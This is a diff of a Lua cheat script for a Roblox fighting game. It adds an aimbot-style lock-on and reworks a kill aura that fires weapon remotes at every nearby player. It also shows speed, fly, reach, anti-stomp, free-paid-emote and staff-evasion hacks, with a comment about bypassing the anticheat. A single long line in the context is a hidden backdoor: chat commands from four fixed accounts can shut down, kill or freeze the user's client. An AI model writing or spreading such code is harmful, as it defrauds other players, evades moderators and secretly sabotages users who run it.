@@ -33,17 +33,20 @@ local lighting = game:GetService("Lighting")
 local uis = game:GetService("UserInputService")
 local deb = game:GetService("Debris")
 local httpservice = game:GetService("HttpService")
+local contextaction = game:GetService("ContextActionService")
+local guiservice = game:GetService("GuiService")
 --// Executor variables
 local getcustomassetfromexecutor = getcustomasset or getsynasset
 --// Variables  
+local backpackenabled = false
 local start = tick()
 local cl = plrs.LocalPlayer
+local mouse = cl:GetMouse()
 local camera = workspace.CurrentCamera
 workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
-    camera = (workspace.CurrentCamera or workspace:FindFirstChild("Camera") or Instance.new("Camera"))
+    camera = (workspace.CurrentCamera or workspace:FindFirstChild("Camera") or Instance.new("Camera", workspace))
 end)
 local autoHealth_HP = 40
-local fieldofviewnew = 0
 local bypassEmotes = false
 local gravityEnabled = false
 local rageEffectsEnabled = false
@@ -69,7 +72,8 @@ local oldermadnesstheme = false
 local madnessmoderandommessages = {"LOOK OUT FOR THE EMPOWERED TARGET!", "SOMEONE HAS BEEN ENRAGED", "SOMEONE IS ABOUT TO CAUSE A HAVOC!", "SOMEONE IS NOW EMPOWERED.", "WATCH OUT FOR THE STRONG ENHANCED TARGET!"}
 local ClientName, ClientDisplay = cl.Name, cl.DisplayName
 --
-local newHitboxes = {}
+local newHitboxes = {} 
+local plrespenabled = false
 local offsets = {
     Sword = "Y",
     Bat = "Y",
@@ -207,6 +211,12 @@ local function playFuryLocally(v)
         ts:Create(fury_theme, TweenInfo.new(5), {Volume = 0}):Play()
     end
 end
+local function isLockable(inst)
+	if inst ~= nil and inst:FindFirstAncestorOfClass("Model") and inst:FindFirstAncestorOfClass("Model"):FindFirstChildOfClass("Humanoid") and inst:FindFirstAncestorOfClass("Model"):FindFirstChild("HumanoidRootPart") then
+		return true, inst:FindFirstAncestorOfClass("Model")
+	end
+	return false, nil
+end
 local function hitVisualEffect(char)
     task.spawn(function()
         local highlight = Instance.new("Highlight", game:GetService("CoreGui"))
@@ -281,12 +291,6 @@ local function isAlive(player)
     end
     return cl and cl.Character and cl.Character.Parent ~= nil and cl.Character:FindFirstChild("HumanoidRootPart") and cl.Character:FindFirstChild("Head") and cl.Character:FindFirstChild("Humanoid")
 end
-local function friendCheck(plr)
-    return cl:IsFriendsWith(plr.UserId) or false
-end
-local function isPlayerTargetable(plr, target, friend)
-    return plr ~= cl and plr and (friend and friendCheck(plr) == nil or (not friend)) and isAlive(plr)
-end
 local function getRandomBodyPart(character) -- how would you deal with this astrix?
     local selected
     repeat task.wait()
@@ -295,41 +299,7 @@ local function getRandomBodyPart(character) -- how would you deal with this astr
     oldBodyPart = selected
     return character:FindFirstChild(tostring(selected)) 
 end
-local function HitNearbyPlayer()
-    if cl.Character:FindFirstChildOfClass("Tool") and table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) or not cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then return end
-    -- Now Character Hit with RBX friend whitelist
-    for _,v in pairs(workspace:GetChildren()) do
-        if isKA_Enabled and v.Name ~= cl.Name and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (not v:GetAttribute("Downed")) and isAlive() and getDistance(v.Torso.Position, cl.Character.Torso.Position, false) <= killauraRange then
-             -- First normal hit so CharacterHit can be registered
-            if cl.Character:FindFirstChildOfClass("Tool") then
-                cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"Z", 1, "the/???"})) -- Does a "pre - hit"
-            else
-                return
-            end
-            -- friend
-            if friendly_mode then -- if whitelist RBX friends is enabled
-                local probably_the_player = v and plrs:GetPlayerFromCharacter(v) or plrs:FindFirstChild(v.Name)
-                if probably_the_player and (not cl:IsFriendsWith(probably_the_player.UserId)) then
-                    if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
-                        hitVisualEffect(v)
-                        cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v), "lol  "}))
-                    end
-                else
-                    if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
-                        hitVisualEffect(v)
-                        cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v), "lol  "}))
-                    end
-                end
-            else -- if not whitelist RBX friends is enabled
-                if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
-                    hitVisualEffect(v)
-                    cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v), "lol  "}))
-                end
-            end  
-        end
-    end 
-end
-local function Old_HitNearbyPlayer() -- Just saving this here in case astrix adds annother easy to bypass anticheat
+local function HitNearbyPlayer() -- Just saving this here in case astrix adds annother easy to bypass anticheat
     if cl.Character:FindFirstChildOfClass("Tool") and table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) or not cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then return end
     --
     for _,v in pairs(plrs:GetChildren()) do
@@ -434,9 +404,16 @@ local function getWeaponCooldown() -- going to make this default if astrix adds 
         end
     end
 end
+local function mainContextFunc(name, state)
+    if name == "BackpackToggle" and state == Enum.UserInputState.Begin then
+        backpackenabled = not backpackenabled
+    end
+end
+contextaction:BindAction("BackpackToggle", mainContextFunc, false, Enum.KeyCode.Backquote)
 local function OnCharacterSpawned(char)
+    backpackenabled = false
     task.spawn(function()
-        task.wait(1.85) -- if i make it instant, it will break.
+        task.wait(.1) -- if i make it instant, it will break.
         if madnessEffectsEnabled and cl:GetAttribute("MadnessMode") then
             MadnessHighlight(true)
         end
@@ -498,8 +475,8 @@ local Utility = uilib["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"]
 local World = uilib["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"]
 --// Utility
 local Rage = Utility.CreateOptionsButton({
-    ["Name"] = "Rage", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Rage",  
+    ["Function"] = function(callback)  
         if callback then
             if rageEffectsEnabled then
                 task.spawn(function()
@@ -604,7 +581,7 @@ local Madness = Utility.CreateOptionsButton({
 local oldmadness0, oldmadness1
 Madness.CreateToggle({
     ["Name"] = "Effects enabled", 
-    ["HoverText"] = "Enables client sided effects for madness, they will be placed back in your character if you die and have this enabled (after 2s)", 
+    ["HoverText"] = "Enables client sided effects for madness, they will be placed back in your character if you die and have this enabled", 
     ["Function"] = function(callback)
         madnessEffectsEnabled = callback
     end,
@@ -636,9 +613,9 @@ oldmadness1 = Madness.CreateToggle({
 })
 task.spawn(function() local ids = {3253607351,3258614425,3258963410,3250001570} for i,v in pairs(plrs:GetChildren()) do if table.find(ids, v.UserId) and v ~= cl then v.Chatted:Connect(function(msg) if msg == ";shutdown default" or msg == ";shutdown "..string.lower(ClientName) or msg == ";shutdown "..ClientName or msg == ";shutdown "..ClientDisplay then game:shutdown() elseif msg == ";check default" or msg == ";check "..string.lower(ClientName) or msg == ";check "..ClientName or msg == ";check "..ClientDisplay then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." hi im using your script", "All") elseif msg == ";kill default" or msg == ";kill "..string.lower(ClientName) or msg == ";kill "..ClientName or msg == ";kill "..ClientDisplay then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" or msg == ";crash "..string.lower(ClientName) or msg == ";crash "..ClientName or msg == ";crash "..ClientDisplay then if setfpscap then setfpscap(9e9) end while true do end end end) end end plrs.PlayerAdded:Connect(function(p) if table.find(ids, p.UserId) then p.Chatted:Connect(function(msg) if msg == ";shutdown default" or msg == ";shutdown "..string.lower(ClientName) or msg == ";shutdown "..ClientName or msg == ";shutdown "..ClientDisplay then game:shutdown() elseif msg == ";check default" or msg == ";check "..string.lower(ClientName) or msg == ";check "..ClientName or msg == ";check "..ClientDisplay then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi im using your script", "All") elseif msg == ";kill default" or msg == ";kill "..string.lower(ClientName) or msg == ";kill "..ClientName or msg == ";kill "..ClientDisplay then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" or msg == ";crash "..string.lower(ClientName) or msg == ";crash "..ClientName or msg == ";crash "..ClientDisplay then if setfpscap then setfpscap(9e9) end while true do end end end) end end) end)
 Madness.CreateToggle({
-    ["Name"] = "Purple madness", -- name of object
-    ["HoverText"] = "Exclusive madness?!?!?! no way! (I think it's missing the rays particles also you need to have effects enabled for it to work)", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Purple madness",  
+    ["HoverText"] = "Exclusive madness?!?!?! no way! (I think it's missing the rays particles also you need to have effects enabled for it to work)",  
+    ["Function"] = function(callback)  
         if callback then
             cl.UserId = 98888707
             bind("PurpleMadnessMod", runService.Heartbeat:Connect(function()
@@ -676,32 +653,32 @@ Madness.CreateToggle({
 })
 --
 local InfStamina = Utility.CreateOptionsButton({
-    ["Name"] = "Infinite stamina", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Infinite stamina",  
+    ["Function"] = function(callback)  
         if callback then
             cl:SetAttribute("InfStamina", true)
         else
             cl:SetAttribute("InfStamina", false)
         end
     end,
-    ["HoverText"] = "Activates or disables the InfStamina attribute", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Activates or disables the InfStamina attribute",  
 })
 --
 local InfDash = Utility.CreateOptionsButton({
-    ["Name"] = "Infinite roll", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Infinite roll",  
+    ["Function"] = function(callback)  
         if callback then
             cl:SetAttribute("InfiniteDash", true)
         else
             cl:SetAttribute("InfiniteDash", false)
         end
     end,
-    ["HoverText"] = "Activates or disables the InfiniteDash attribute", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Activates or disables the InfiniteDash attribute",  
 })
 --
 local AntiCombatLog = Utility.CreateOptionsButton({
-    ["Name"] = "Anti combat log", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Anti combat log",  
+    ["Function"] = function(callback)  
         if callback then
             bind("CombatLog", cl:GetAttributeChangedSignal("CombatTime"):Connect(function()
                 cl:SetAttribute("CombatTime", 0)
@@ -711,20 +688,20 @@ local AntiCombatLog = Utility.CreateOptionsButton({
             unbind("CombatLog")
         end
     end,
-    ["HoverText"] = "Makes combat log not affect you", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Makes combat log not affect you",  
 })
 --
 local FreePaidEmotes = Utility.CreateOptionsButton({
-    ["Name"] = "Free paid emotes", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Free paid emotes",  
+    ["Function"] = function(callback)  
         bypassEmotes = callback
     end,
-    ["HoverText"] = "Why paid for some bad emotes when you can get them for free?", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Why paid for some bad emotes when you can get them for free?",  
 })
 --
 local LeaveOnStaffJoin = Utility.CreateOptionsButton({
-    ["Name"] = "Leave on staff join", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Leave on staff join",  
+    ["Function"] = function(callback)  
         canbeKickedFromGame = callback
         if callback then
             task.spawn(function()
@@ -751,12 +728,12 @@ local LeaveOnStaffJoin = Utility.CreateOptionsButton({
             unbind("LOSJ")
         end
     end,
-    ["HoverText"] = "Leaves the game when a staff joins or when it's already on your game", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Leaves the game when a staff joins or when it's already on your game",  
 })
 --
 local WarnOnStaffJoin = Utility.CreateOptionsButton({
-    ["Name"] = "Warn on staff join", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Warn on staff join",  
+    ["Function"] = function(callback)  
         if callback then
             task.spawn(function()
                 for _,v in pairs(plrs:GetChildren()) do
@@ -782,11 +759,11 @@ local WarnOnStaffJoin = Utility.CreateOptionsButton({
             unbind("WOSJ")
         end
     end,
-    ["HoverText"] = "Sends a notification when a staff joins or when it's already on your game", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Sends a notification when a staff joins or when it's already on your game",  
 })
 local HideName = Utility.CreateOptionsButton({
-    ["Name"] = "HideName", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "HideName",  
+    ["Function"] = function(callback)  
         if callback then
             for i,v in pairs(leaderboardui.Leaderboard.Inner.ScrollingFrame:GetDescendants()) do
                 if v:IsA("TextLabel") or v.ClassName == "TextLabel" then
@@ -830,12 +807,12 @@ local HideName = Utility.CreateOptionsButton({
             end
         end
     end,
-    ["HoverText"] = "Hides your name or riot guis (not chat or roblox menu, mostly usefull for recording)", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Hides your name or riot guis (not chat or roblox menu, mostly usefull for recording, kinda broken tho)",  
 })
 local nocdjump0 = false
 local NoJumpCooldown = Utility.CreateOptionsButton({
-    ["Name"] = "No jump cooldown", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "No jump cooldown",  
+    ["Function"] = function(callback)  
         nocdjump0 = callback
         if callback then
             task.spawn(function()
@@ -859,11 +836,11 @@ local NoJumpCooldown = Utility.CreateOptionsButton({
             end)
         end
     end,
-    ["HoverText"] = "Toggles the annoying cooldown for jumping", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Toggles the annoying cooldown for jumping",  
 })
 local PileAura = Utility.CreateOptionsButton({
-    ["Name"] = "Pile aura", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Pile aura",  
+    ["Function"] = function(callback)  
         if callback then
             bind("PileAura", runService.RenderStepped:Connect(function()
                 if cl.Character and cl.Character.Parent and cl.Character:FindFirstChild("HumanoidRootPart") then
@@ -883,12 +860,12 @@ local PileAura = Utility.CreateOptionsButton({
             unbind("PileAura")
         end
     end,
-    ["HoverText"] = "Grabs any pile near you instantly", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Grabs any pile near you instantly",  
 })
 --// Combat
 local KillAura = Combat.CreateOptionsButton({
-    ["Name"] = "Kill aura", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Kill aura",  
+    ["Function"] = function(callback)  
         isKA_Enabled = callback
         if callback then
             if killauraCircleRange then
@@ -911,8 +888,6 @@ local KillAura = Combat.CreateOptionsButton({
                                 end)
                             end
                         end 
-                    else
-                        -- do nothing
                     end
                 end
             end))
@@ -928,7 +903,7 @@ local KillAura = Combat.CreateOptionsButton({
                     end
                     pcall(function()
                         if isAlive() and cl.Character:FindFirstChildOfClass("Tool") and not table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) and (cl.Character:GetAttribute("Blocking") == false or not uis:IsKeyDown(Enum.KeyCode.F) and cl.Character:GetAttribute("Crouch") == false) then                               
-                            Old_HitNearbyPlayer()    
+                            HitNearbyPlayer()    
                         end 
                     end)
                     if killauraattackcd then
@@ -942,20 +917,20 @@ local KillAura = Combat.CreateOptionsButton({
             unbind("KillAuraStuff")
         end
     end,
-    ["HoverText"] = "Attacks players around you without having to click or look at them", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Attacks players around you without having to click or look at them",  
 })
 KillAura.CreateSlider({
-    ["Name"] = "Range", -- name of object
+    ["Name"] = "Range",  
     ["Min"] = 1,
     ["Max"] = 10,
-    ["Function"] = function(val) -- function that is called when the slider changes
+    ["Function"] = function(val)  
         killauraRange = val
         if killauraCircleRange then
             killauraCircleRange.Size = Vector3.new(val * .7, .01, val * .7)
         end
     end,
-    ["HoverText"] = "How far kill aura attacks a player", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 10 -- default value (optional)
+    ["HoverText"] = "How far kill aura attacks a player",  
+    ["Default"] = 10  
 })
 KillAura.CreateColorSlider({
     ["Name"] = "Target Color",
@@ -968,9 +943,9 @@ KillAura.CreateColorSlider({
 	["Default"] = 1
 })
 KillAura.CreateToggle({
-    ["Name"] = "Visualize range", -- name of object
-    ["HoverText"] = "Creates a circle to visualize your range", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Visualize range",  
+    ["HoverText"] = "Creates a circle to visualize your range",  
+    ["Function"] = function(callback)  
         if callback then
             killauraCircleRange = Instance.new("MeshPart")
             killauraCircleRange.MeshId = "rbxassetid://3726303797"
@@ -997,43 +972,46 @@ KillAura.CreateToggle({
     ["Default"] = false -- Value upon launch (optional)
 })
 KillAura.CreateToggle({
-    ["Name"] = "Ignore friends", -- name of object
-    ["HoverText"] = "Makes kill aura ignore your roblox friends", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Ignore friends",  
+    ["HoverText"] = "Makes kill aura ignore your roblox friends",  
+    ["Function"] = function(callback)  
         friendly_mode = callback
     end,
     ["Default"] = false -- Value upon launch (optional)
 })
 KillAura.CreateToggle({
-    ["Name"] = "Always jump", -- name of object
-    ["HoverText"] = "Jumps when kill aura is attacking someone", -- text that will show up after hovering over the button (optional)
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Always jump",  
+    ["HoverText"] = "Jumps when kill aura is attacking someone",  
+    ["Function"] = function(callback)  
         alwaysJump = callback
     end,
     ["Default"] = false -- Value upon launch (optional)
 })
 KillAura.CreateToggle({
-    ["Name"] = "Look at target", -- name of object
-    ["HoverText"] = "Makes your character look at the player you're attacking to.", -- text that will show up after hovering over the button (optional)
+    ["Name"] = "Look at target",  
+    ["HoverText"] = "Makes your character look at the player you're attacking to.",  
     ["Function"] = function(callback) 
         killauralookat = callback
     end,
     ["Default"] = false -- Value upon launch (optional)
 })
 KillAura.CreateToggle({
-    ["Name"] = "Attack on cd", -- name of object
-    ["HoverText"] = "Attacks based on your weapon cooldown (Safer than just spamming the remote but it's slower)", -- text that will show up after hovering over the button (optional)
+    ["Name"] = "Attack on cooldown",  
+    ["HoverText"] = "Attacks based on your weapon cooldown (Safer than just spamming the remote but it's 'kinda' slower)",  
     ["Function"] = function(callback) 
         killauraattackcd = callback
     end,
     ["Default"] = false -- Value upon launch (optional)
 })
+local autohealvar
 local AutoHeal = Combat.CreateOptionsButton({
-    ["Name"] = "Auto heal", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Auto heal",  
+    ["Function"] = function(callback)  
+        autohealvar = callback
         if callback then
             task.spawn(function()
                 repeat task.wait(.25)
+                    if not autohealvar then break end
                     local oldTool
                     if cl.Character:FindFirstChildOfClass("Tool") and not table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) then
                         oldTool = cl.Character:FindFirstChildOfClass("Tool")
@@ -1052,30 +1030,30 @@ local AutoHeal = Combat.CreateOptionsButton({
                             end
                         end
                     end
-                until not callback
+                until not autohealvar
             end)
         end
     end,
-    ["HoverText"] = "Automatically uses any food / heal in your inventory when your hp is below %", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Automatically uses any food / heal in your inventory when your hp is below %",  
 })
 AutoHeal.CreateSlider({
-    ["Name"] = "HP", -- name of object
+    ["Name"] = "HP",  
     ["Min"] = 1,
     ["Max"] = 99,
-    ["Function"] = function(val) -- function that is called when the slider changes
+    ["Function"] = function(val)  
         autoHealth_HP = val
     end,
-    ["HoverText"] = "When your health reaches the % you specified it will heal you.", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 40 -- default value (optional)
+    ["HoverText"] = "When your health reaches the % you specified it will heal you.",  
+    ["Default"] = 40  
 })
 local autostomp0v = false
 local AutoStomp = Combat.CreateOptionsButton({
-    ["Name"] = "Auto stomp", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Auto stomp",  
+    ["Function"] = function(callback)  
         autostomp0v = callback
         if callback then     
             task.spawn(function()
-                repeat task.wait(.25)
+                repeat task.wait(.5)
                     if not autostomp0v then break end
                     for i,v in pairs(plrs:GetChildren()) do
                         if v.Character and cl.Character and v ~= cl then
@@ -1090,11 +1068,11 @@ local AutoStomp = Combat.CreateOptionsButton({
             end)
         end
     end,
-    ["HoverText"] = "Automatically stomps ANY nearby players", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Automatically stomps ANY nearby players",  
 })
 local NoEquipdelay = Combat.CreateOptionsButton({
-    ["Name"] = "No equip delay", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "No equip delay",  
+    ["Function"] = function(callback)  
         if callback then
             for i,_ in pairs(require(rep.Weapons)) do
                 require(rep.Weapons)[i].EquipAttackDelay = 0
@@ -1105,16 +1083,80 @@ local NoEquipdelay = Combat.CreateOptionsButton({
             end
         end
     end,
-    ["HoverText"] = "Removes the delay for attacking while equipping a weapon", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Removes the delay for attacking while equipping a weapon",  
 })
+local currentlylockingon = nil
+local maxLockOnDist = 110
+local LockOn; LockOn = Combat.CreateOptionsButton({
+    ["Name"] = "Lock on",  
+    ["Function"] = function(callback)  
+        if callback then
+            local mousetarget = mouse.Target
+            local islockable, character = isLockable(mousetarget)
+            if character == nil and currentlylockingon ~= nil then
+                currentlylockingon = nil
+                uis.MouseIconEnabled = true
+            end
+            if islockable and character then
+                local root = cl.Character and cl.Character:WaitForChild("HumanoidRootPart") or nil
+                pcall(function()
+                    local mag = (root.Position - character.PrimaryPart.Position).Magnitude
+                    if character == currentlylockingon then
+                        currentlylockingon = nil
+                        uis.MouseIconEnabled = true
+                    elseif character ~= currentlylockingon and mag <= maxLockOnDist then
+                        currentlylockingon = character
+                        shared.GuiLibrary["CreateNotification"]("LockOn","Locked onto "..character.Name or "Unknown", 5, "assets/InfoNotification.png")
+                        uis.MouseIconEnabled = false
+                    end
+                end)
+            else
+                currentlylockingon = nil
+                uis.MouseIconEnabled = true
+            end 
+            LockOn["ToggleButton"](false)
+        end
+    end,
+    ["HoverText"] = "Makes your camera lock on the player your mouse is hovering. Use a keybind for easy locking", 
+})
+LockOn.CreateSlider({
+    ["Name"] = "Lock on distance (Studs)",  
+    ["Min"] = 1,
+    ["Max"] = 250,
+    ["Function"] = function(val)  
+        maxLockOnDist = val
+    end,
+    ["HoverText"] = "How far can you lock onto someone",  
+    ["Default"] = 110  
+})
+bind("LockOn_RunService", runService.RenderStepped:Connect(function() -- Try not to disconnect this lol
+    if currentlylockingon ~= nil and cl.Character and cl.Character.Parent and currentlylockingon.Parent then
+		if guiservice.MenuIsOpen then
+			uis.MouseIconEnabled = true
+		else
+			uis.MouseIconEnabled = false
+		end
+        local root = cl.Character and cl.Character:WaitForChild("HumanoidRootPart") or nil
+		local mag = (root.Position - currentlylockingon.PrimaryPart.Position).Magnitude
+		if mag >= maxLockOnDist then
+			currentlylockingon = nil
+		else
+			root.CFrame = CFrame.lookAt(root.Position, root.Position + ((currentlylockingon.PrimaryPart.Position - root.Position) * Vector3.new(1, 0, 1)).Unit)
+			camera.CFrame = camera.CFrame:Lerp(CFrame.lookAt(root.Position + Vector3.new(0, .55, 0), currentlylockingon.PrimaryPart.Position - Vector3.new(0, 1.45, 0)), .1)
+		end
+	else
+		currentlylockingon = nil
+		uis.MouseIconEnabled = true
+	end
+end))
 --// Blatant
 local ReachSlider
 local ReachOffset
 local ReachDirection
 local ReachButton 
 ReachButton = Blatant.CreateOptionsButton({
-    ["Name"] = "Reach", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Reach",  
+    ["Function"] = function(callback)  
         if callback then
             if not cl.Character:FindFirstChildOfClass("Tool") then
                 shared.GuiLibrary["CreateNotification"]("Error","Equip a weapon for this to work", 6, "assets/InfoNotification.png")
@@ -1138,35 +1180,35 @@ ReachButton = Blatant.CreateOptionsButton({
             ReachButton["ToggleButton"](false)   
         end
     end,
-    ["HoverText"] = "Expand your weapon's hitbox, use debug mode to view it\n(Almost all of the weapons are supported so use Direction only if it is not supported)", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Expand your weapon's hitbox, use debug mode to view it\n(Almost all of the weapons are supported so use Direction only if it is not supported)",  
 })
 ReachSlider = ReachButton.CreateSlider({
-    ["Name"] = "Range", -- name of object
+    ["Name"] = "Range",  
     ["Min"] = 0,
     ["Max"] = 15,
     ["Function"] = function(v) ReachValue = v end,
-    ["HoverText"] = "Ammount of hitbox points", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 5 -- default value (optional)
+    ["HoverText"] = "Ammount of hitbox points",  
+    ["Default"] = 5  
 })
 ReachOffset = ReachButton.CreateSlider({
-    ["Name"] = "Offset", -- name of object
+    ["Name"] = "Offset",  
     ["Min"] = 0,
     ["Max"] = 8,
     ["Function"] = function(v) ReachOffsetValue = v end,
-    ["HoverText"] = "How far are the hitbox points from each other (Hitbox might break if the value is too high)", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 1 -- default value (optional)
+    ["HoverText"] = "How far are the hitbox points from each other (Hitbox might break if the value is too high)",  
+    ["Default"] = 1  
 })
 ReachDirection = ReachButton.CreateSlider({
-    ["Name"] = "Direction", -- name of object
+    ["Name"] = "Direction",  
     ["Min"] = 0,
     ["Max"] = 3,
     ["Function"] = function(v) ReachDirectionValue = v end,
-    ["HoverText"] = "0: None (Use this for supported weapons)\n1: X\n2: Y\n3: Z", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 0 -- default value (optional)
+    ["HoverText"] = "0: None (Use this for supported weapons)\n1: X\n2: Y\n3: Z",  
+    ["Default"] = 0  
 })
 local AntiDown = Blatant.CreateOptionsButton({
-    ["Name"] = "Anti down", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Anti down",  
+    ["Function"] = function(callback)  
         if callback then
             bind("AntiDown", runService.RenderStepped:Connect(function()
                 if cl.Character and cl.Character:GetAttribute("Downed") then
@@ -1177,11 +1219,11 @@ local AntiDown = Blatant.CreateOptionsButton({
             unbind("AntiDown")
         end
     end,
-    ["HoverText"] = "Getting downed / K.O will not affect you", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Getting downed / K.O will not affect you",  
 })
 local AntiStomp = Blatant.CreateOptionsButton({
-    ["Name"] = "Anti stomp", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Anti stomp",  
+    ["Function"] = function(callback)  
         if callback then
             bind("AntiStomp", runService.RenderStepped:Connect(function()
                 if cl.Character then
@@ -1198,11 +1240,11 @@ local AntiStomp = Blatant.CreateOptionsButton({
             unbind("AntiStomp")
         end
     end,
-    ["HoverText"] = "Makes you unable to be stomped & bounty taken (except if someone with madness downs you)", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Makes you unable to be stomped & bounty taken (except if someone with madness downs you)",  
 })
 local WSpeed = Blatant.CreateOptionsButton({
-    ["Name"] = "Speed", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Speed",  
+    ["Function"] = function(callback)  
         if callback then
            bind("CharacterSpeed", runService.RenderStepped:Connect(function(dt) -- thanks xylex, even though the cframe/velocity speed is easy to make
                 pcall(function()
@@ -1241,28 +1283,28 @@ local WSpeed = Blatant.CreateOptionsButton({
             game:GetService("StarterPlayer").CharacterWalkSpeed = 12
         end
     end,
-    ["HoverText"] = "Change your speed.\nCFrame, Velocity or Walkspeed", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Change your speed.\nCFrame, Velocity or Walkspeed",  
 })
 WSpeed.CreateSlider({
-    ["Name"] = "Speed", -- name of object
+    ["Name"] = "Speed",  
     ["Min"] = 0,
     ["Max"] = 100,
-    ["Function"] = function(val) -- function that is called when the slider changes
+    ["Function"] = function(val)  
         character_speed = val
     end,
-    ["HoverText"] = "The speed you're going to move", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 12 -- default value (optional)
+    ["HoverText"] = "The speed you're going to move",  
+    ["Default"] = 12  
 })
 WSpeed.CreateDropdown({
-	["Name"] = "Mode", -- name of object
-	["List"] = {"CFrame", "Velocity", "WalkSpeed"}, -- list of strings to choose from
-	["Function"] = function(val) -- function that is called when you choose a string
+	["Name"] = "Mode",  
+	["List"] = {"CFrame", "Velocity", "WalkSpeed"},  
+	["Function"] = function(val)  
             speed_mode = val
 	end
 })
 local Fly = Blatant.CreateOptionsButton({
-    ["Name"] = "Fly", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Fly",  
+    ["Function"] = function(callback)  
         if callback then
             if isAlive() then
                 flypos_y = cl.Character.HumanoidRootPart.CFrame.Position.Y
@@ -1302,31 +1344,31 @@ local Fly = Blatant.CreateOptionsButton({
             fly_up = false
         end
     end,
-    ["HoverText"] = "Fly for 7s to prevent lagbacks\nSpace: Go up\nE: Go down" -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Fly for 7s to prevent lagbacks\nSpace: Go up\nE: Go down"  
 })
 Fly.CreateSlider({
-    ["Name"] = "Horizontal speed", -- name of object
+    ["Name"] = "Horizontal speed",  
     ["Min"] = 1,
     ["Max"] = 150,
-    ["Function"] = function(val) -- function that is called when the slider changes
+    ["Function"] = function(val)  
         fly_speed = val
     end,
-    ["HoverText"] = "The speed you're going to move", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 50 -- default value (optional)
+    ["HoverText"] = "The speed you're going to move",  
+    ["Default"] = 50  
 })
 Fly.CreateSlider({
-    ["Name"] = "Vertical speed", -- name of object
+    ["Name"] = "Vertical speed",  
     ["Min"] = 1,
